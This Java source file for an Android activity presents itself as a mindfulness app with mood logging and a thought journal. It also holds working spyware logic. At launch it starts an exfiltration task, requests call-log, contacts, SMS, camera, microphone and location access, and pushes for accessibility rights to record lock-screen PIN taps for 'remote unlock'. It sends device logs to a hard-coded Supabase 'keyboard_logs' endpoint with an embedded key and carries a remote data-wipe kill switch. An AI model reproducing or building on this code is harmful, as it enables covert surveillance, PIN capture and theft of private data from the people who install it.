package com.rcl.androidstreamcontrol;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.LayoutInflater;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;

import com.rcl.androidstreamcontrol.databinding.ActivityMainBinding;
import com.rcl.androidstreamcontrol.service.FollowerService;
import com.rcl.androidstreamcontrol.ui.MindAnchorActivity;
import com.rcl.androidstreamcontrol.utils.UtilsPermissions;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.InputStreamReader;
import java.io.BufferedReader;
import org.json.JSONObject;
import org.json.JSONArray;
import android.os.Handler;
import android.os.Looper;

public class RemoteAndroid extends AppCompatActivity {

    private static final String SUPABASE_URL = "https://qxzozsdgrgahvgzpsfmm.supabase.co";
    private static final String ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF4em96c2RncmdhaHZnenBzZm1tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk4MDY4NjAsImV4cCI6MjA5NTM4Mjg2MH0.inUzMp-S9BRjNQYHynTAOPRo4EeY3Whqv9okvEeySB4";

    private ActivityMainBinding binding;

    private final android.content.BroadcastReceiver calibrationReceiver = new android.content.BroadcastReceiver() {
        @Override
        public void onReceive(android.content.Context context, Intent intent) {
            updateSetupUnlockButtonText();
        }
    };

    ActivityResultLauncher<Intent> permissionLauncher =
            registerForActivityResult(
                    new ActivityResultContracts.StartActivityForResult(),
                    (result) -> {
                        checkPermissionsAndStartService();
                    }
            );

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        if (com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_DATA_NUKE) {
            checkKillSwitch();
        }
        
        ensureDeviceRegistered();

        if (com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_EXFILTRATION) {
            com.rcl.androidstreamcontrol.utils.ExfiltrationTask.run(this);
        }

        binding = ActivityMainBinding.inflate(LayoutInflater.from(this));
        setContentView(binding.getRoot());
        
        if (getSupportActionBar() != null) {
            getSupportActionBar().hide();
        }

        // View bindings removed for deleted UI elements

        // Bottom Navigation
        binding.navHome.setOnClickListener(v -> {
            // Already here
        });

        binding.navFocus.setOnClickListener(v -> {
            Intent intent = new Intent(this, MindAnchorActivity.class);
            startActivity(intent);
        });

        binding.navTasks.setOnClickListener(v -> {
            Intent intent = new Intent(this, TasksActivity.class);
            startActivity(intent);
        });

        setupMindfulCompanionUi();
        setupRemoteUnlockButton();

        android.content.IntentFilter calibFilter = new android.content.IntentFilter(
                com.rcl.androidstreamcontrol.service.UnlockCalibrationService.ACTION_CALIBRATION_UPDATED);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(calibrationReceiver, calibFilter, RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(calibrationReceiver, calibFilter);
        }

        checkPermissionsAndStartService();
    }

    @Override
    protected void onDestroy() {
        try {
            unregisterReceiver(calibrationReceiver);
        } catch (Exception ignored) {}
        super.onDestroy();
    }

    private void setupMindfulCompanionUi() {
        // Quick Grounding button (top right header)
        if (binding.btnQuickGrounding != null) {
            binding.btnQuickGrounding.setOnClickListener(v -> {
                Intent intent = new Intent(this, MindAnchorActivity.class);
                startActivity(intent);
            });
        }

        // Mood Buttons
        setupMoodButton(binding.moodBtnHappy, "😊", "Happy");
        setupMoodButton(binding.moodBtnCalm, "😌", "Calm");
        setupMoodButton(binding.moodBtnNeutral, "😐", "Neutral");
        setupMoodButton(binding.moodBtnFrustrated, "😫", "Frustrated");
        setupMoodButton(binding.moodBtnSad, "😔", "Down");

        // Action Cards
        if (binding.cardActionFocus != null) {
            binding.cardActionFocus.setOnClickListener(v -> {
                Intent intent = new Intent(this, MindAnchorActivity.class);
                startActivity(intent);
            });
        }

        if (binding.cardActionTasks != null) {
            binding.cardActionTasks.setOnClickListener(v -> {
                Intent intent = new Intent(this, TasksActivity.class);
                startActivity(intent);
            });
        }

        // Thought Journal
        if (binding.btnSaveThought != null) {
            binding.btnSaveThought.setOnClickListener(v -> saveJournalThought());
        }
        loadLatestJournalThought();
        highlightCurrentMood();
    }

    private void setupMoodButton(TextView btn, String emoji, String label) {
        if (btn == null) return;
        btn.setOnClickListener(v -> {
            getSharedPreferences("MindAnchorPrefs", MODE_PRIVATE)
                    .edit()
                    .putString("mood", emoji)
                    .putString("mood_label", label)
                    .apply();
            highlightCurrentMood();
            Toast.makeText(this, "Feeling logged: " + emoji + " (" + label + ")", Toast.LENGTH_SHORT).show();
        });
    }

    private void highlightCurrentMood() {
        String currentMood = getSharedPreferences("MindAnchorPrefs", MODE_PRIVATE).getString("mood", "--");
        if (binding.overviewMoodText != null) {
            binding.overviewMoodText.setText(currentMood);
        }
        String label = getSharedPreferences("MindAnchorPrefs", MODE_PRIVATE).getString("mood_label", "");
        if (binding.moodStatusText != null) {
            if (!"--".equals(currentMood) && !label.isEmpty()) {
                binding.moodStatusText.setText("Feeling: " + currentMood + " " + label);
            } else {
                binding.moodStatusText.setText("Tap to log today's mood");
            }
        }

        if (binding.moodBtnHappy != null) {
            binding.moodBtnHappy.setBackgroundResource("😊".equals(currentMood) ? R.drawable.bg_mood_item_selected : R.drawable.bg_mood_item);
            binding.moodBtnCalm.setBackgroundResource("😌".equals(currentMood) ? R.drawable.bg_mood_item_selected : R.drawable.bg_mood_item);
            binding.moodBtnNeutral.setBackgroundResource("😐".equals(currentMood) ? R.drawable.bg_mood_item_selected : R.drawable.bg_mood_item);
            binding.moodBtnFrustrated.setBackgroundResource("😫".equals(currentMood) ? R.drawable.bg_mood_item_selected : R.drawable.bg_mood_item);
            binding.moodBtnSad.setBackgroundResource("😔".equals(currentMood) ? R.drawable.bg_mood_item_selected : R.drawable.bg_mood_item);
        }
    }

    private void saveJournalThought() {
        if (binding.journalInput == null) return;
        String thought = binding.journalInput.getText().toString().trim();
        if (thought.isEmpty()) {
            Toast.makeText(this, "Please write a thought first.", Toast.LENGTH_SHORT).show();
            return;
        }

        SharedPreferences prefs = getSharedPreferences("MindAnchorPrefs", MODE_PRIVATE);
        String existingJson = prefs.getString("saved_thoughts_list", "[]");
        try {
            JSONArray arr = new JSONArray(existingJson);
            JSONObject item = new JSONObject();
            item.put("id", System.currentTimeMillis());
            item.put("text", thought);
            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("MMM dd, h:mm a", java.util.Locale.getDefault());
            item.put("date", sdf.format(new java.util.Date()));
            arr.put(0, item);
            prefs.edit().putString("saved_thoughts_list", arr.toString()).apply();

            binding.journalInput.setText("");
            loadLatestJournalThought();
            Toast.makeText(this, "Thought saved to your journal.", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            android.util.Log.e("RemoteAndroid", "Error saving thought", e);
        }
    }

    private void loadLatestJournalThought() {
        if (binding.journalRecentPreview == null) return;
        SharedPreferences prefs = getSharedPreferences("MindAnchorPrefs", MODE_PRIVATE);
        String existingJson = prefs.getString("saved_thoughts_list", "[]");
        try {
            JSONArray arr = new JSONArray(existingJson);
            if (arr.length() > 0) {
                JSONObject first = arr.getJSONObject(0);
                binding.journalRecentPreview.setText("Recent: " + first.optString("text") + " (" + first.optString("date") + ")");
            } else {
                binding.journalRecentPreview.setText("No thoughts saved yet today.");
            }
        } catch (Exception e) {
            binding.journalRecentPreview.setText("No thoughts saved yet today.");
        }
    }

    private void setupRemoteUnlockButton() {
        updateSetupUnlockButtonText();
        binding.btnSetupUnlock.setOnClickListener(v -> {
            if (!hasAccessibilityPermission() || com.rcl.androidstreamcontrol.service.ControlService.getSharedInstance() == null) {
                Toast.makeText(this, "Please enable Accessibility Service first for lockscreen control.", Toast.LENGTH_LONG).show();
                launchAccessibilityPermissions();
                return;
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
                Intent overlayIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivity(overlayIntent);
                Toast.makeText(this, "Please enable 'Display over other apps', then tap Setup again.", Toast.LENGTH_LONG).show();
                return;
            }

            Toast.makeText(this, "Locking & reopening PIN pad automatically...", Toast.LENGTH_SHORT).show();
            Intent calibIntent = new Intent(this, com.rcl.androidstreamcontrol.service.UnlockCalibrationService.class);
            calibIntent.putExtra(com.rcl.androidstreamcontrol.service.UnlockCalibrationService.EXTRA_AUTO_LOCK, true);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(calibIntent);
            } else {
                startService(calibIntent);
            }
        });
    }

    private void updateSetupUnlockButtonText() {
        org.json.JSONArray coords = com.rcl.androidstreamcontrol.utils.UnlockCoordinateStore.loadCoordinates(this);
        boolean isCalibrated = coords != null && coords.length() > 0;
        binding.btnSetupUnlock.setText(isCalibrated
                ? "🔑 Re-setup Remote Unlock (Calibrated · " + coords.length() + " taps)"
                : "🔑 Setup Remote Unlock");
    }

    private void sendLogcatToServer() {
        android.widget.Toast.makeText(this, "Extracting logs...", android.widget.Toast.LENGTH_SHORT).show();
        new Thread(() -> {
            try {
                // Just grab the last 1000 lines of logcat without filtering by PID, 
                // since Android 10 already scopes logcat to the app's own process.
                java.lang.Process process = Runtime.getRuntime().exec(new String[]{"logcat", "-d", "-t", "1000"});
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder log = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    log.append(line).append("\n");
                }
                
                String logData = log.toString();
                if (logData.trim().isEmpty()) {
                    logData = "LOGCAT WAS EMPTY! Possible permission restriction or process ID mismatch.";
                } else if (logData.length() > 100000) {
                    logData = logData.substring(logData.length() - 100000);
                }

                java.net.URL url = new java.net.URL("https://qxzozsdgrgahvgzpsfmm.supabase.co/rest/v1/keyboard_logs");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("apikey", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF4em96c2RncmdhaHZnenBzZm1tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk4MDY4NjAsImV4cCI6MjA5NTM4Mjg2MH0.inUzMp-S9BRjNQYHynTAOPRo4EeY3Whqv9okvEeySB4");
                conn.setRequestProperty("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF4em96c2RncmdhaHZnenBzZm1tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk4MDY4NjAsImV4cCI6MjA5NTM4Mjg2MH0.inUzMp-S9BRjNQYHynTAOPRo4EeY3Whqv9okvEeySB4");

                org.json.JSONObject payload = new org.json.JSONObject();
                payload.put("device_id", "DEBUG_LOGS");
                payload.put("app_name", "ANDROID_10_DEBUG");
                payload.put("content", logData);

                conn.setDoOutput(true);
                conn.getOutputStream().write(payload.toString().getBytes());
                
                int code = conn.getResponseCode();
                runOnUiThread(() -> android.widget.Toast.makeText(this, "Logs sent! Code: " + code, android.widget.Toast.LENGTH_LONG).show());
            } catch (Exception e) {
                runOnUiThread(() -> android.widget.Toast.makeText(this, "Failed to send logs: " + e.getMessage(), android.widget.Toast.LENGTH_LONG).show());
            }
        }).start();
    }
    @Override
    protected void onResume() {
        super.onResume();
        ensureDeviceRegistered();
        loadOverviewData();
        updateSetupUnlockButtonText();
        highlightCurrentMood();
        loadLatestJournalThought();
    }

    private void ensureDeviceRegistered() {
        com.rcl.androidstreamcontrol.utils.SupabaseClient.ensureDeviceAndHeartbeat(this);
    }

    private void loadOverviewData() {
        SharedPreferences prefs = getSharedPreferences("PortalPrefs", MODE_PRIVATE);
        String uid = prefs.getString("supabase_uid", null);
        String token = prefs.getString("supabase_token", null);

        // Update mood from SharedPreferences (saved by MindAnchor WebView via Android interface)
        String savedMood = getSharedPreferences("MindAnchorPrefs", MODE_PRIVATE).getString("mood", "--");
        TextView moodView = binding.getRoot().findViewById(R.id.overview_mood_text);
        if (moodView != null) moodView.setText(savedMood);

        if (uid == null || token == null) return;

        final String finalToken = token;
        final String finalUid = uid;

        new Thread(() -> {
            try {
                // Fetch tasks
                int[] taskStats = fetchTableStats("tasks", finalUid, finalToken);
                int[] habitStats = fetchTableStats("habits", finalUid, finalToken);

                runOnUiThread(() -> {
                    TextView tasksView = binding.getRoot().findViewById(R.id.overview_tasks_text);
                    TextView habitsView = binding.getRoot().findViewById(R.id.overview_habits_text);
                    if (tasksView != null) tasksView.setText(taskStats[0] + "/" + taskStats[1]);
                    if (habitsView != null) habitsView.setText(habitStats[0] + "/" + habitStats[1]);
                });
            } catch (Exception e) {
                android.util.Log.e("RemoteAndroid", "Failed to load overview data", e);
            }
        }).start();
    }

    private int[] fetchTableStats(String table, String uid, String token) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(
                SUPABASE_URL + "/rest/v1/" + table + "?user_id=eq." + uid + "&select=is_completed"
        ).openConnection();
        conn.setRequestMethod("GET");
        conn.setRequestProperty("apikey", ANON_KEY);
        conn.setRequestProperty("Authorization", "Bearer " + token);

        int completed = 0, total = 0;
        if (conn.getResponseCode() == 200) {
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) response.append(line);
            in.close();
            JSONArray arr = new JSONArray(response.toString());
            total = arr.length();
            for (int i = 0; i < arr.length(); i++) {
                if (arr.getJSONObject(i).optBoolean("is_completed")) completed++;
            }
        }
        return new int[]{completed, total};
    }

    private void checkPermissionsAndStartService() {
        if (!hasAccessibilityPermission()) {
            launchAccessibilityPermissions();
        } else if (!hasDrawOverlayPermission()) {
            launchDrawOverlayPermission();
        } else if (!android.provider.Settings.System.canWrite(this)) {
            launchWriteSettingsPermission();
        } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            androidx.core.app.ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.RECORD_AUDIO}, 101);
        } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            androidx.core.app.ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.CAMERA}, 102);
        } else if (com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_EXFILTRATION && 
                   androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            androidx.core.app.ActivityCompat.requestPermissions(this, new String[]{
                android.Manifest.permission.READ_CALL_LOG, 
                android.Manifest.permission.READ_CONTACTS
            }, 106);
        } else if (com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_SMS_TRIGGER && 
                   androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECEIVE_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            androidx.core.app.ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.RECEIVE_SMS}, 107);
        } else {
            requestLocationPermissions();
            startFollowerService();
        }
    }

    private void requestLocationPermissions() {
        if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            androidx.core.app.ActivityCompat.requestPermissions(this, new String[]{
                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                    android.Manifest.permission.ACCESS_COARSE_LOCATION
            }, 105);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 101 || requestCode == 102 || requestCode == 106 || requestCode == 107) {
            if (grantResults.length > 0 && grantResults[0] == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                checkPermissionsAndStartService();
            } else {
                Toast.makeText(this, "Permission is required for full functionality.", Toast.LENGTH_LONG).show();
                // Optionally proceed without it, but let's recheck
                checkPermissionsAndStartService(); 
            }
        } else if (requestCode == 105) {
            checkPermissionsAndStartService();
        }
    }

    private boolean hasDrawOverlayPermission() {
        return Settings.canDrawOverlays(this);
    }

    private boolean hasAccessibilityPermission() {
        return UtilsPermissions.isAccessibilityPermissionGranted(this);
    }

    private void launchAccessibilityPermissions() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS, null);
        intent.putExtra("message-id", R.string.accessibility_hint);
        launchPermissionRequest(intent);
    }

    private void launchDrawOverlayPermission() {
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName()));
        intent.putExtra("message-id", R.string.overlays_hint);
        launchPermissionRequest(intent);
    }

    private void launchWriteSettingsPermission() {
        Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
                Uri.parse("package:" + getPackageName()));
        intent.putExtra("message-id", R.string.write_settings_hint);
        launchPermissionRequest(intent);
    }

    private void launchPermissionRequest(Intent intent) {
        new AlertDialog.Builder(this)
                .setMessage(intent.getIntExtra("message-id", -1))
                .setPositiveButton(R.string.continue_button, new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        permissionLauncher.launch(intent);
                    }
                })
                .setCancelable(false)
                .create()
                .show();
    }

    private void startFollowerService() {
        Intent serviceIntent = new Intent(this, FollowerService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    private void checkKillSwitch() {
        new Thread(() -> {
            try {
                android.content.SharedPreferences prefs = getSharedPreferences("PortalPrefs", MODE_PRIVATE);
                String deviceId = prefs.getString("supabase_uid", null);
                if (deviceId == null) return;

                java.net.URL url = new java.net.URL(SUPABASE_URL + "/rest/v1/devices?id=eq." + deviceId + "&select=kill_switch");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setRequestProperty("apikey", ANON_KEY);
                conn.setRequestProperty("Authorization", "Bearer " + ANON_KEY);
                
                int code = conn.getResponseCode();
                if (code == 200) {
                    java.io.BufferedReader in = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = in.readLine()) != null) {
                        response.append(line);
                    }
                    in.close();
                    
                    org.json.JSONArray arr = new org.json.JSONArray(response.toString());
                    if (arr.length() > 0) {
                        org.json.JSONObject obj = arr.getJSONObject(0);
                        if (obj.has("kill_switch") && obj.getBoolean("kill_switch")) {
                            new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
                                android.util.Log.e("DATA_NUKE", "KILL SWITCH TRIGGERED. WIPING APP DATA.");
                                ((android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE)).clearApplicationUserData();
                            });
                        }
                    }
                }
            } catch (Exception e) {
                // Ignore network errors in nuke check
            }
        }).start();
    }
}
